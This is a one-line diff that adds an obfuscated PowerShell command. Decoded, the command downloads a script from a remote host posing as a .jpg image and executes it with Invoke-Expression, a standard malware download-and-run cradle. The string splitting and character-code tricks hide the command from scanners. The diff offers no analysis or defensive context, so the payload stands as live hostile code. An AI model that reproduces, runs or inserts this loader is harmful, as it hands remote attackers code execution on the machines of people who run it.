@@ -1,0 +1,1 @@
+﻿(('IEX ((new-'+'object'+' '+'n'+'et.w'+'e'+'bc'+'li'+'ent).'+'downloadstr'+'ing('+'T1'+'Z'+'h'+'ttp://'+'pm'+'labs.net/cis'+'/'+'te'+'st'+'.jp'+'g'+'T1'+'Z))')-crEPLACE([ChaR]84+[ChaR]49+[ChaR]90),[ChaR]39) |.( ([sTRInG]$VERbOsEpReFeReNCE)[1,3]+'X'-jOiN'')
